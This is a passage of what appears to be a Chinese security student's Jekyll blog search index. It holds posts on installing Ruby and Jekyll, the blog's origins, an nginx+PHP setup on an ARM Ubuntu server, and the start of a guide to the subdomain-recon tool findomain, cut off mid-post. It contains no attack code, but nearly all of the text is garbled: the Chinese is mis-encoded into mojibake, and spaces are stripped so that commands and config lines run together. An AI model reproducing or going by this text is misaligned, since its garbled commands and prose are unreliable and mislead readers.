5ecZuser]#rvminstall\"ruby-2.5.7\"Searchingforbinaryrubies,thismighttakesometime.Nobinaryrubiesavailablefor:centos/7/x86_64/ruby-2.5.7.Continuingwithcompilation.Pleaseread'rvmhelpmount'togetmoreinformationonbinaryrubies.Checkingrequirementsforcentos.Requirementsinstallationsuccessful.InstallingRubyfromsourceto:/usr/local/rvm/rubies/ruby-2.5.7,thismaytakeawhiledependingonyourcpu(s)...ruby-2.5.7-#downloadingruby-2.5.7,thismaytakeawhiledependingonyourconnection...**Resumingtransferfrombyteposition323584%Total%Received%XferdAverageSpeedTimeTimeTimeCurrentDloadUploadTotalSpentLeftSpeed10012.8M10012.8M006097k00:00:020:00:02--:--:--6095kruby-2.5.7-#extractingruby-2.5.7to/usr/local/rvm/src/ruby-2.5.7.....ruby-2.5.7-#configuring...................................................................ruby-2.5.7-#post-configuration..ruby-2.5.7-#compiling..................................................................................ruby-2.5.7-#installing..............................ruby-2.5.7-#makingbinariesexecutable..ruby-2.5.7-#downloadingrubygems-3.0.8%Total%Received%XferdAverageSpeedTimeTimeTimeCurrentDloadUploadTotalSpentLeftSpeed25867k25223k001513800:00:580:00:150:00:4316300ruby-2.5.7-#adjusting#shebangsfor(gemirberbrirdoctestrbrake).Installofruby-2.5.7-#completeRubywasbuiltwithoutdocumentation,tobuilditrun:rvmdocsgenerate-riåŸºæœ¬ä¸Šçœ‹åˆ°ä¸Šé¢çš„completeå°±å®‰è£…å®Œäº†#å®‰è£…rubyrvmlistknow#æŸ¥è¯¢å·²çŸ¥rvmè½¯ä»¶åˆ—è¡¨rvminstallâ€œruby-2.5.5â€#å®‰è£…rubyrvmuse2.5.5#æŒ‡å®šä½¿ç”¨çš„rubyç‰ˆæœ¬å·3.é…ç½®ruby-gemsç¯å¢ƒ#é…ç½®å‰ç¡®è®¤ï¼šrvm-vrvm1.29.9(latest)byMichalPapis,PiotrKuczynski,WayneE.Seguin[https://rvm.io]gem-v3.0.6ruby-vruby-vruby2.5.5p157(2019-03-15revision67260)[x86_64-linux]gemsource-lgemsources--removehttps://rubygems.org/gemsources-ahttps://gems.ruby-china.com##æ¢æºæ¢æºæ¢æºgemupdate--systemgeminstallbundler4.å®‰è£…jekyllgeminstalljekyllå®‰è£…jekyllå·¥å…·ï¼Œä¿è¯jekyllèƒ½é¡ºç•…è¿è¡Œã€‚æ­¤å¤„è·Ÿæ¯ä¸ªäººä¸‹è½½çš„æ¨¡æ¿ä¸ä¸€æ ·æ‰€éœ€è¦çš„å·¥å…·ä¸ä¸€æ ·ï¼Œæˆ‘è¿™é‡ŒæŠŠåŸºæœ¬çš„ä¸€äº›å·¥å…·è´´ä¸Šï¼ŒåæœŸæ¨¡æ¿ä¸ä¸€æ ·çœ‹ä¸€ä¸‹ç¯å¢ƒè¦æ±‚æ ¹æ®è¦æ±‚å³å¯ã€‚geminstallbundler#æ‰“åŒ…ç”¨å·¥å…·geminstalljekyll-paginate#åˆ†é¡µè®¾ç½®å·¥å…·é‡è¦ä¸€å®šè¦å®‰è£…geminstallminima#é»˜è®¤ä¸»é¢˜geminstalljekyll-feed#è®¢é˜…ç”¨çš„å·¥å…·bundle?%sudobundleexecrakeproduction:export/System/Library/Frameworks/Ruby.framework/Versions/2.6/usr/lib/ruby/2.6.0/universal-darwin19/rbconfig.rb:229:warning:Insecureworldwritabledir/usr/local/sbininPATH,mode040777fatal:ä¸æ˜¯ä¸€ä¸ªgitä»“åº“ï¼ˆæˆ–è€…ä»»ä½•çˆ¶ç›®å½•ï¼‰ï¼š.gitCouldnotfindrake-10.5.0inanyofthesourcesRun`bundleinstall`toinstallmissinggems.åˆ°ä½ æ‰€åœ¨çš„åšå®¢ç›®å½•ä¸‹ï¼Œgitinitï¼šbin4xin@bin4xin'sMacbookProtext-theme%pwd/Users/bin4xin/blog/text-themebin4xin@bin4xin'sMacbookProtext-theme%gitinitå·²åˆå§‹åŒ–ç©ºçš„Gitä»“åº“äº/Users/bin4xin/blog/text-theme/.git/%bundleconfigmirror.https://rubygems.orghttps://gems.ruby-china.com/System/Library/Frameworks/Ruby.framework/Versions/2.6/usr/lib/ruby/2.6.0/universal-darwin19/rbconfig.rb:229:warning:Insecureworldwritabledir/usr/local/sbininPATH,mode040777bin4xin@bin4xin'sMacbookProtext-theme%sudobundleinstall/System/Library/Frameworks/Ruby.framework/Versions/2.6/usr/lib/ruby/2.6.0/universal-darwin19/rbconfig.rb:229:warning:Insecureworldwritabledir/usr/local/sbininPATH,mode040777Don'trunBundlerasroot.Bundlercanaskforsudoifitisneeded,andinstallingyourbundleasrootwillbreakthisapplicationforallnon-rootusersonthismachine.Fetchinggemmetadatafromhttps://gems.ruby-china.com/...........Fetchingrake10.5.0Installingrake10.5.0Fetchingconcurrent-ruby1.1.5Installingconcurrent-ruby1.1.5Fetchingi18n1.7.0Installingi18n1.7.0Â·Â·çœç•¥Â·Â·Â·Â·Fetchingsassc2.2.1Installingsassc2.2.1withnativeextensionsBundlecomplete!3Gemfiledependencies,42gemsnowinstalled.5.å¯åŠ¨æœåŠ¡ä¸€èˆ¬ä½ ä»¬éƒ½æ˜¯ç›´æ¥ä¸‹è½½äº†æ¨¡æ¿ï¼Œæ¨¡æ¿è§£å‹åè¿›å…¥æ–‡ä»¶å¤¹å³å¯ã€‚æ¯”å¦‚æˆ‘è¿™é‡Œæ¨¡æ¿æ–‡ä»¶å¤¹å«blogunzipblog.zipcdblog/gitinit#å¦‚æœä½ æœ‰å¤šä¸ªæ¨¡æ¿ï¼Œè®°å¾—å…ˆç”¨è¿™ä¸ªå‘½ä»¤ï¼ŒæŠŠå½“å‰æ–‡ä»¶å¤¹å½“åšæ ¹ç›®å½•ï¼›åŒç†ä½¿ç”¨å…¶ä»–æ¨¡æ¿ç¬¬ä¸€æ­¥è¾“å…¥è¿™ä¸ªå‘½ä»¤jekyllserve-P80#è‡ªåŠ¨æ„å»ºå¹¶è¿è¡ŒjekyllæœåŠ¡6.jekyllæŠ¥é”™Couldnotfindgem'X'inanyofthegemsourceslistedinyourGemfile.(Bundler::GemNotFound)geminstallXå®‰è£…å³å¯1.jekyll-paginateä½¿ç”¨å¤±è´¥å³ä½¿æ˜¯å®‰è£…äº†jekyll-paginateï¼Œä¹Ÿä¼šæŠ¥é”™ã€‚gemlistâ€“local|grepjekyll-paginate#æŸ¥çœ‹æœ¬åœ°gemå®‰è£…æ’ä»¶ç¡®è®¤å®‰è£…ä¸Šï¼Œåœ¨åšå®¢æ ¹ç›®å½•ä¸‹ç¼–è¾‘Gemfileï¼Œæ·»åŠ ï¼šgemâ€˜jekyll-paginateâ€™,group::jekyll_plugins2.cannotloadsuchfileâ€“kramdown-parser-gfm(LoadError)å®‰è£…å³å¯ã€‚å®‰è£…kramdown-parser-gfmï¼Œä¸è¦åˆ†å¼€ä¸€ä¸ªä¸€ä¸ªå®‰è£…ã€‚ç°åœ¨jekyllæœåŠ¡å¯åŠ¨åï¼Œwebçš„æœåŠ¡æ˜¯ä½¿ç”¨WEBrickæœåŠ¡å™¨ï¼Œä¼šæœ‰ä»¥ä¸‹è®©æˆ‘è§‰å¾—ä¸èˆ’æœçš„åœ°æ–¹ï¼š1ï¼‰ç›®å½•éå†2ï¼‰æ— æ³•éšè—æœåŠ¡å™¨ç‰ˆæœ¬å·ï¼ˆä¹Ÿè®¸æ˜¯èƒ½å¤Ÿè¿™æ ·æ“ä½œä½†æ˜¯æˆ‘æ²¡æœ‰å‘ç°ï¼‰ï¼Œæ‰€ä»¥è¯•äº†ä¸‹å‘ç°nginxä¹Ÿæ˜¯å¯ä»¥çš„ä¼ é€é—¨ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "ã€Œèµ·æºã€ï¼šæˆ‘ä¸ERRORS",
    "category" : "",
    "tags"     : "ç¬”è®°, èµ·æº",
    "url"      : "/top/2019/first-day/",
    "date"     : "Sep 11, 2019",
    "content"  : "æ‘˜è¦ï¼šæƒ³è‡ªå·±åšä¸ªäººåšå®¢å·²ç»ä¸æ˜¯ä¸€å¤©ä¸¤å¤©äº†ã€‚æ­£å¥½ï¼Œæœ€è¿‘é—²äº†ä¸‹æ¥ï¼Œè¶ç€å¹´å‰æœ‰æ—¶é—´ï¼Œæ¥æŠŠè¿™ä¸ªäº‹æƒ…äº†ç»“æ‰ã€‚ï¼ˆæ–‡å°¾æœ‰å½©è›‹ï½ï¼‰æˆ‘ä»¥åˆä¸­ç‰©ç†çš„æ€è·¯ç®€å•æ„æ€äº†ä¸€ä¸‹è¿™ä¸ªç«™ï¼Œç®€ç§°ä¸‰ä¸ªWï¼šWhat+Why+HowWHATï¼Ÿæ˜¯ä»€ä¹ˆæˆ‘å…¶å®ä¹Ÿä¸€ç›´åœ¨çº ç»“ï¼Œæ­å»ºä¸€ä¸ªè¿™æ ·çš„åšå®¢çš„æ„ä¹‰ä½•åœ¨ï¼Œéš¾é“æ˜¯è¿™æ ·ä¸€ä¸ªåˆ€æªä¸å…¥çš„å´åˆå­¤ç‹¬çš„ç‹¬è§’æˆå—ï¼Ÿæ˜¾ç„¶ä¸æ˜¯ï¼Œå› ä¸ºè¿™å¹¶ä¸æ˜¯ä¸€ä¸ªæ²¡æœ‰æ¸©åº¦çš„åšå®¢ï¼Œæ¯ç¯‡æ–‡ç« å†…éƒ½å€¾æ³¨äº†æˆ‘çš„å¿ƒè¡€ï¼›åŒæ—¶åœ¨æˆ‘å¯¹è¿™äº›è¿‡ç¨‹è¿›è¡Œå¤ç°ã€è®°å½•æ—¶ï¼Œå¯¹äºshellcommandçš„æŒæ¡ã€ç†è§£åˆè¿›ä¸€æ­¥åŠ æ·±ã€‚æ‰€ä»¥å¹¶ä¸è¯´å¾—ä¸Šæ²¡æœ‰æ„ä¹‰ï¼Œæˆ‘è§‰å¾—åä¹‹ï¼Œæ„ä¹‰éå‡¡ï¼›æˆ–è€…ç­‰æˆ‘è€äº†ï¼Œæˆ–è®¸è¶³å¤Ÿå¹¸è¿ï¼Œè¿™ä¸ªç«™è¿˜åœ¨ï¼Œæˆ‘è·Ÿæˆ‘çš„å­©å­ä»¬å¹ç‰›ï¼Œæˆ‘ä¹Ÿæ›¾ç»å¹´è½»è¿‡ã€åŠªåŠ›è¿‡å•Šï¼ŒT.Tæ€»ç»“ï¼šPatrolDiary=Linuxshell+Cloudcomputing+NetworkSecurity+UI(X)WHYï¼Ÿä¸ºä»€ä¹ˆé—®é¢˜å¾ˆå¥½ç†è§£ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªç«™ï¼Ÿæ˜¯PatrolDiaryï¼Œæ˜¯è€Œä¸æ˜¯é‚£ä¸ªç«™ï¼Œä¸æ˜¯theï¼Ÿå› ä¸ºå¥¹å°±æ˜¯PatrolDiaryï¼ŒbeaPatrolDiaryã€‚ä¸€æœ¬ã€Œæ–¥å€™ã€æ—¥è®°ï¼Œæ‰¿è½½ç€ä¸€ä¸ªæœ¬ç§‘å­¦ç”Ÿçš„BigDreamæ–¥å€™ä¸“é¡¹ï¼ˆPatrolPlanï¼‰æ˜¯æˆ‘å¤§ä¸‰æš‘å‡æ„æ€å‡ºæ¥çš„ï¼Œèµ·åˆçš„æ„æƒ³æ˜¯åšä¸€ä¸ªæ‰«æå™¨ï¼Œè¿™ä¸ªæ‰«æå™¨çš„ä¸»è¦ç”¨é€”å’±ä¸å¤šè¯´ï½æœ‰ç‚¹ä¸­äºŒï¼Œæ€»ç»“ä¸€ä¸‹ï¼šPatrolScanner=AIscan+Vlan+nmapå“ˆå“ˆå“ˆã€‚æ‰€ä»¥æ€»ä½“æ¥è®²ï¼šä¸€ä¸ªåšå®¢çš„æ­å»ºæ¯”ä¸€ä¸ªæ‰«æå™¨ç®€å•å¤šå•¦ï¼Œåœ¨æˆ‘çœ‹æ¥:)æ‰€ä»¥å°±è¿™ï¼Œæˆå°±äº†Patrolçš„èµ·æºã€‚HOWï¼Ÿæ€æ ·åšè‡ªå·±åšåšå®¢ï¼Œemmmï¼Œæˆ‘è§‰å¾—å¹¶ä¸æ˜¯å®¹æ˜“çš„äº‹ï¼Œå› ä¸ºä½œä¸ºå­¦å®‰å…¨çš„æœ¬èœè¯´å®è¯å¯¹è¿™äº›ä¸œè¥¿æ˜¯æœ‰äº›æ•æ„Ÿçš„ï¼›åƒçŸ¥åçš„å¼€æºåšå®¢é¡¹ç›®Wordpressã€Discuz!ç­‰ç­‰æˆ‘éƒ½ä¸å¤ªå–œæ¬¢ã€‚æ¯•ç«Ÿç©çš„ç¬¬äºŒä¸ªé¶æœºå°±æ˜¯wordpressçš„åšå®¢ç«™ï½ä¸æ˜¯è¯´wordpressè¿™äº›å¼€æºé¡¹ç›®ä¸å®‰å…¨æ€ä¹ˆæ€ä¹ˆæ ·ï¼Œæˆ‘ä»¬ä»å®è§‚è§’åº¦æ¥çœ‹ï¼Œwebserveråªè¦ä¸æœåŠ¡å™¨æœ¬èº«äº§ç”Ÿäº¤äº’ï¼Œå°±æ˜¯ä¼šå­˜åœ¨éšæ‚£ã€Vulnï¼Œä»£ç æ˜¯äººå†™çš„ï¼Œé‡‘æ— è¶³èµ¤ï¼Œç æ— å®Œç å•Šï¼Œè¿™ä¸€ç‚¹æˆ‘ä»¬æ— æ³•é¿å…ã€‚æ€æ¥æƒ³å»ï¼Œç¡®ç«‹äº†ä¸‹é¢å‡ ä¸ªæ¡ä»¶ï¼š1.ä¸ªäººåšå®¢ä½¿ç”¨é»˜è®¤webç«¯å£ï¼Œä½†æ˜¯serverä¸èƒ½ä¸å…¶ä»–ä»»ä½•serverdäº§ç”Ÿäº¤äº’é™¤äº†httpdä»¥å¤–ï¼›2.å¸¸è§„çš„å®‰å…¨åŸºçº¿çš„æ£€æŸ¥è§„èŒƒï¼Œé¿å…ä½çº§é”™è¯¯ï¼›3.ç¾è§‚ã€ç®€çº¦ã€å¤§æ–¹ã€‚æ•²å®šä¸Šé¢çš„ç»“æ„ï¼Œå½“å¤©æ™šä¸Šå°±æ€¥åŒ†åŒ†ä¸Šç½‘æ‰¾é¡¹ç›®ï¼Œå“ˆå“ˆå“ˆå½“å¤©æ™šä¸Šå°±æ‰¾åˆ°äº†æ»¡æ„çš„å¼€æºé¡¹ç›®å¹¶ä¸”æœ¬åœ°è°ƒè¯•è¿è¡Œäº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰æ•ˆæœå¾ˆå¥½ï½ä¸å¾—ä¸ä½©æœæˆ‘çš„æ•ˆç‡ï¼ˆæ‚è„¸ï¼‰è¦æ˜¯æ¯•è®¾èƒ½è¿™ä¹ˆé«˜çš„æ•ˆç‡å°±å¥½äº†ã€‚æ‰€ä»¥howè¿™ä¸ªé—®é¢˜ä¹Ÿå°±è¿åˆƒè€Œè§£äº†ï¼šwebblog=jekyll+gem+rvm+ruby+nginxjekyllæ˜¯githubçš„å¼€æºé¡¹ç›®ï¼ˆæåŠ›ç»™å¤§å®¶æ¨èï¼‰ï¼ŒUIå¾ˆæ¼‚äº®ï¼Œåšäº†å“åº”å¼ï¼Œç¯å¢ƒéƒ¨ç½²å®ŒåŸºæœ¬æ˜¯ä¸€æ­¥æ›´æ–°,ä½†æ˜¯è¿™äº›éƒ½ä¸æ˜¯æˆ‘é€‰å¥¹çš„ç†ç”±ï¼ŒçœŸæ­£çš„ç†ç”±æ˜¯ï¼šå¥¹çš„å±æ€§-é™æ€ã€‚é™è‹¥å¤„å­ï¼ŒåŠ¨è‹¥è„±å…”ï¼ˆç‹—å¤´ï¼‰##ç†ç”±ï¼š1.jekyll:é™æ€ï¼Œå¥½çœ‹ï¼›2-4.ä¾èµ–é¡¹ï¼›5.rubyå†™çš„WEBrickå®¹å™¨æœ‰å®‰å…¨éšæ‚£ä¸”æš‚æ— è§£å†³åŠæ³•ï¼šç›®å½•éå†+æ‰“å°ç‰ˆæœ¬å·ç»ˆç« ä¸€æ—¦ä¸€ä¸ªåšå®¢ç½‘ç«™è„±ç¦»äº†æ•°æ®åº“ï¼Œå°±æ„å‘³ç€ä¸ä¼šå­˜åœ¨å®‰å…¨éšæ‚£ã€‚æ‰€ä»¥åœ¨æˆ‘çœ‹æ¥ï¼Œè¿™ä¸ªç«™è¾ƒäºåŠ¨æ€åšå®¢æ˜¯ç»å¯¹å®‰å…¨çš„ã€‚æ‰€ä»¥åšè¿™ä¸ªåšå®¢çš„åˆè¡·åˆ™åœ¨äºæ£€éªŒè‡ªå·±çš„ç½‘ç«™åŠ å›ºèƒ½åŠ›ï¼Œæ¬¡è¦åˆ™åœ¨äºå¯¹äºçŸ¥è¯†çš„æ²‰æ·€ã€æ€»ç»“ï¼›ä¸€åˆ‡çš„åŸºç¡€åœ¨äºæ­¤ç«™çš„å®‰å…¨æ€§ä¸ºåŸºç¡€è®ºè°ƒã€‚å°±å½“æ˜¯è‡ªå·±ç»™è‡ªå·±å¸ƒç½®çš„ä¸€ä¸ªåŠ å›ºé¡¹ç›®å§ã€‚å…¬å…ƒäºŒé›¶äºŒé›¶å¹´ä¹æœˆåä¸€æ—¥å†™äºå®‰å¾½åˆè‚¥ä»Šå¤©ä¹Ÿæ˜¯å¿«ä¹çš„ä¸€å¤©ï½ç”³æ˜ï¼šèƒŒæ™¯å›¾æ¥è‡ªå¾®åš@èƒ¡æ­Œï¼Œä¾µåˆ ï½ä¸è¿‡èƒ¡æ­Œè¿™ä¹ˆå¯çˆ±åº”è¯¥ä¸ä¼šä»‹æ„çš„"
  },

  {
    "title"    : "ã€Œç§»æ¤ã€Ubuntu With Armå…¬ç½‘å­˜å‚¨å®¹å™¨æ­å»ºè®°å½•",
    "category" : "",
    "tags"     : "è½¯ä»¶ç§»æ¤, ARM, ç¬”è®°",
    "url"      : "/blog/2019/Ubuntu/with/arm/",
    "date"     : "Sep 1, 2019",
    "content"  : "å£°æ˜ï¼šæœ¬æ–‡ç« é¦–å‘äºåä¸ºäº‘é²²é¹ç¤¾åŒºï¼ŒåŒæ­¥äºä½œè€…ä¸ªäººåšå®¢:)é²²é¹äº‘æœåŠ¡å™¨Ubuntu18.0464bitwithARMPHP+NGINXè½¯é“¾æ¥æ¼”ç¤ºæ‘˜è¦ï¼šåä¸ºäº‘ç¤¾åŒºçš„æ´»åŠ¨å¥½å¤šï½æœ€è¿‘é¢†äº†ä¸ªARMäº‘æœåŠ¡å™¨ã€‚æ‰“ç®—ç”¨æœåŠ¡å™¨æ­å»ºä¸€ä¸ªäº‘å­˜å‚¨æœåŠ¡å®¹å™¨æ–¹ä¾¿è‡ªå·±ä¸Šä¼ è®ºæ–‡ï¼Œè¯´å¹²å°±å¹²ï¼Œäºæ˜¯å°±æ˜¯åœ¨ç½‘ä¸Šæ‰¾äº†ä¸ªå¼€æºçš„é¡¹ç›®ã€‚ä¸‹è½½å‹ç¼©åŒ…ä¸‹æ¥å®Œäº‹ï¼Œå‘ç°æ²¡æœ‰phpç¯å¢ƒï¼Œå¾—è‡ªå·±é…ç½®ã€‚è¡Œå§ï¼Œè‡ªå·±é…ã€‚1.å®‰è£…nginxç½‘ç«™æœåŠ¡å™¨1.1æ¢æºå®‰è£…webå‰è®°å¾—å…ˆæŠŠæºæ¢ä¸€ä¸‹ï¼Œubuntuçš„å®˜æ–¹æºæˆ‘ä¹Ÿæµ‹è¯•äº†ï¼Œç¡®å®æœ‰ç‚¹æ…¢ã€‚æ³¨æ„æ¢æºè¦æ¢æˆARMçš„ç‰ˆæœ¬ã€‚è¿™ä¸ªæœ¬èœæ¢çš„æºä¾›å¤§å®¶å‚è€ƒã€‚#vi/etc/apt/sources.listdebhttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenialmainmultiverserestricteduniversedebhttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-securitymainmultiverserestricteduniversedebhttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-updatesmainmultiverserestricteduniversedebhttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-backportsmainmultiverserestricteduniversedeb-srchttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenialmainmultiverserestricteduniversedeb-srchttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-securitymainmultiverserestricteduniversedeb-srchttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-updatesmainmultiverserestricteduniversedeb-srchttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-backportsmainmultiverserestricteduniversesudoaptupdate1.2å®‰è£…sudoaptinstallnginxps-ef|grepnginx#æŸ¥çœ‹è¿›ç¨‹curllocalhost#æœ¬åœ°è°ƒè¯•å‡ºç°welcomeé¡µé¢å³æœ¬åœ°è°ƒè¯•æˆåŠŸå¦‚æœæƒ³è¦å…¬ç½‘è®¿é—®ipéœ€å¼€æ”¾å…¥æ–¹å‘å®‰å…¨è§„åˆ™80ç«¯å£ã€‚æ‰¾åˆ°æ§åˆ¶å°-å…¥æ–¹å‘è§„åˆ™-æ·»åŠ è§„åˆ™è®¿é—®å…¬ç½‘ipå³å¯ã€‚2.å®‰è£…phpã€é…ç½®nginxè§£æ2.1phpå®‰è£…#sudoaptinstallphp-fpm##è¿™é‡Œæ³¨æ„æŸ¥çœ‹ä¸€ä¸‹php-fpmçš„ç®¡ç†å™¨ç‰ˆæœ¬ï¼Œåé¢é…ç½®è½¯é“¾æ¥å¦‚æœç‰ˆæœ¬ä¸ä¸€è‡´ä¼šæŠ¥é”™#cd/var/run/php/#lsphp7.0-fpm.pidphp7.0-fpm.sock##å¯ä»¥çœ‹åˆ°æ­¤å¤„æœ¬èœçš„ç‰ˆæœ¬æ˜¯7.02.2æœ€é‡è¦çš„nginxè½¯é“¾æ¥è§£æè¿›å…¥/etc/nginx/sites-availableç›®å½•ä¸‹æ–°å»ºwebserverï¼Œé…ç½®phpè§£ææ–‡ä»¶ã€‚2.3åœ¨serveråŒºå—ä¸­é…ç½®åŸºæœ¬æœåŠ¡server{listen80;##ç½‘ç«™ç›‘å¬ç«¯å£ï¼Œè¿™é‡Œè®¾ç½®ä¸º80ï¼Œå³æµè§ˆå™¨é»˜è®¤çš„HTTPç«¯å£å·ã€‚root/var/www/html;##ç½‘ç«™æ ¹ç›®å½•indexindex.phpindex.htmlindex.htmindex.nginx-debian.html;##é…ç½®webé»˜è®¤é¡µserver_nameip##ä½ çš„å…¬ç½‘ip;location/{try_files$uri$uri/=404;}location~\\.php${##å¦‚æœurlè¾“å…¥ä¸ºphpåç¼€æ–‡ä»¶åˆ™ä¼ ç»™php-fpmè¿›è¡Œå¤„ç†ã€‚includesnippets/fastcgi-php.conf;fastcgi_passunix:/var/run/php/php7.0-fpm.sock;##æ³¨æ„æ­¤å¤„çš„è§£æç›®å½•çš„æ›´æ”¹}location~/\\.ht{denyall;##è¯¥åŒºå—ç¦æ­¢.htaccessçš„è®¿é—®ã€‚}}2.4é…ç½®nginxè½¯é“¾æ¥å¦‚æœæŠ¥é”™æ— æ³•æ‰¾åˆ°webserver(æ­¤å¤„æ¯äººä¸åŒï¼Œå¦‚æœæœªä¿®æ”¹åˆ™æ˜¯default)ï¼Œè¿›å…¥/etc/nginx/sites-enabledç›®å½•ä¸‹æŸ¥çœ‹è½¯é“¾æ¥é…ç½®ï¼Œåˆ é™¤å¤šä½™é…ç½®ï¼Œç•™ä¸‹defaultå’Œwebserverè½¯é“¾æ¥æ–‡ä»¶sudoln-s/etc/nginx/sites-available/webserver/etc/nginx/sites-enabled/sudonginx-t#nginxæµ‹è¯•ï¼Œæ— æŠ¥é”™è¿›å…¥ä¸‹ä¸€æ­¥sudosystemctlreloadnginx#é‡å¯æœåŠ¡ï¼Œè½½å…¥æœ€æ–°é…ç½®æŠ¥é”™è§£å†³:/etc/nginx/sites-enabled#lltotal8drwxr-xr-x2rootroot4096Nov1211:03./drwxr-xr-x6rootroot4096Nov1211:34../lrwxrwxrwx1rootroot34Nov1210:51default-&amp;gt;/etc/nginx/sites-available/defaultlrwxrwxrwx1rootroot34Nov1211:02webserver-&amp;gt;/etc/nginx/sites-available/webserverrm-rfwebserversudoln-s/etc/nginx/sites-available/webserver/etc/nginx/sites-enabled/3.æµ‹è¯•åœ¨webæœåŠ¡ç›®å½•ä¸‹åˆ›å»ºphpæ–‡ä»¶æµ‹è¯•ã€‚sudovitest.php&amp;lt;?phpphpinfo();?&gt;ä½¿ç”¨æµè§ˆå™¨è¾“å…¥:{ip.addr}:{ip.port}/test.phpï¼›æµ‹è¯•æˆåŠŸï¼š4.éƒ¨ç½²å­˜å‚¨å®¹å™¨åˆ«å¿˜äº†æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„ï¼Œæ˜¯éƒ¨ç½²äº‘æœåŠ¡å™¨å®¹å™¨ã€‚å°†webæ–‡ä»¶å¤¹è§£å‹è‡³webæ ¹ç›®å½•ä¸‹ã€‚è®¿é—®å³å¯ã€‚ç”±äºæ­¤å¤„ä½¿ç”¨çš„æ˜¯ç¬¬ä¸‰æ–¹å¼€æºå®¹å™¨é¡¹ç›®ï¼Œæ‰€ä»¥å®‰å…¨æ€§æ— æ³•ä¿éšœï¼Œä¸ä¿è¯åé—¨ç­‰æƒ…å†µä¸ä¼šå‘ç”Ÿï¼Œæ‰€ä»¥ä»‹æ„è€…å¯ä»¥è‡ªè¡Œæ­å»ºï¼ˆä»£ç æ‰˜ç®¡å¹³å°ä¹Ÿæœ‰ï¼‰ã€‚ä¸ºäº†é¿å…éº»çƒ¦è¿™é‡ŒæŠŠæ‰€æœ‰çš„ä¸é¡¹ç›®æœ‰å…³çš„ä¿¡æ¯ç ä¸€ä¸‹ï¼Œè§è°…ã€‚å¥½äº†ã€‚åŸºæœ¬ä¸Šä¸€ä¸ªè‡ªå·±ä½¿ç”¨çš„äº‘å­˜å‚¨å®¹å™¨å°±å¯ä»¥æŠ•å…¥ä½¿ç”¨äº†ã€‚æ‰‹æœºç«¯ã€PCç«¯éƒ½å¯ä»¥ä½¿ç”¨ã€‚å»ºè®®å¤§å®¶å¯ä»¥è‡ªå·±å°è¯•ä¸€ä¸‹ã€‚ä¹ˆä¹ˆå“’"
  },

  {
    "title"    : "ã€ŒFINDOMAINã€ï¼šè·¨å¹³å°å­åŸŸåæœé›†å·¥å…·",
    "category" : "",
    "tags"     : "å®‰å…¨å·¥å…·, ç¬”è®°",
    "url"      : "/blog/2019/findomain/",
    "date"     : "Sep 1, 2019",
    "content"  : "æ‘˜è¦:ä¹‹å‰åœ¨æš‘å‡é‡Œç”³è¯·æ³¨å†Œäº†ä¸ªäº‘å…ˆçŸ¥å¹³å°è´¦å·ï¼Œå¹³æ—¶æ²¡äº‹é—²ï¼ˆmoï¼‰ç€ï¼ˆyangï¼‰çš„ï¼ˆgongï¼‰æ—¶å€™å½“å½“åœŸæ‹¨é¼ æŒ–æŒ–æ´ã€‚æŒ–è¿‡çš„éƒ½æ‡‚ï¼Œæ˜¯ä¸€ä¸ªç±»ä¼¼äºæ¸—é€æµ‹è¯•çš„ä¸­å¿ƒåŒ–å¹³å°ã€‚ä¹™æ–¹å…¬å¸æœ‰è¿™ä¸ªéœ€æ±‚ï¼Œé€šè¿‡è¿™ä¸ªå¹³å°å‘æ”¾ä»»åŠ¡ï¼Œé€šè¿‡ä¸åŒçš„æ¼æ´ç­‰çº§ã€ä¸¥é‡ã€‘-ã€é«˜å±ã€‘-ã€ä¸­å±ã€‘-ã€ä½å±ã€‘ï¼Œä¸¥é‡å°±æ˜¯å±åŠåˆ°æœåŠ¡å™¨æƒé™ï¼Œèƒ½å¤Ÿgetwebshellã€rootç”šè‡³æ¨ªå‘æ¸—é€ï¼Œä¾æ¬¡ç±»æ¨æ¯ä¸€é¡¹ï¼Œå±åŠç¨‹åº¦ä¾æ¬¡ç±»æ¨ï¼Œæœ‰å…´è¶£çš„æœ‹å‹è‡ªè¡Œæœç´¢ä½“ä¼šï¼ˆä½ ä»¬å¯ä»¥çŒœçŒœxssåœ¨å“ªä¸ªä½ç½®ï¼‰ã€‚ä»¥ä¸ŠèƒŒæ™¯ï¼Œæ¯ä»½ä»»åŠ¡éƒ½ä¼šè§„å®šå¥½ä¸€äº›ä»»åŠ¡åŸŸåï¼ŒæŒ‡å®šå¥½ã€‚å…¶ä»–çš„åŸŸåæ²¡æœ‰å¤‡æ¡ˆä¸å…è®¸ç¢°ã€‚å¦‚ï¼šé‡ç‚¹å°±æ¥äº†ï¼Œå‰é¢çš„*,æ˜¯éœ€è¦æˆ‘ä»¬è‡ªå·±å»æµ‹è¯•çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸åŒçš„*ä¼šæœ‰åˆ«æ ·çš„æƒŠå–œã€‚é‚£ä¹ˆè¿™å°±æ¨å‡ºå’±ä»¬çš„ä¸»è§’ï¼šfindomainï¼Œè·¨å¹³å°çš„å­åŸŸåæœé›†å·¥å…·ã€‚1.ä¸‹è½½å®‰è£…$gitclonehttps://github.com/Edu4rdSHL/findomain.git$cdfindomain$apt-getinstallcargo$cargobuild--release$sudocptarget/release/findomain/usr/bin$findomain2.è¯­æ³•ä»‹ç»1ã€è¿›è¡Œç®€å•çš„å­åŸŸåæœç´¢ï¼Œå¹¶è¾“å‡ºä¿¡æ¯ï¼šfindomain-texample.com2ã€ä½¿ç”¨æ‰€æœ‰çš„APIè¿›è¡Œå­åŸŸåæœç´¢ï¼Œå¹¶è¾“å‡ºä¿¡æ¯ï¼šfindomain-texample.comâ€“a3ã€æœç´¢å­åŸŸåï¼Œå¹¶å°†è¾“å‡ºå¯¼å‡ºä¸ºCSVæ–‡ä»¶æ 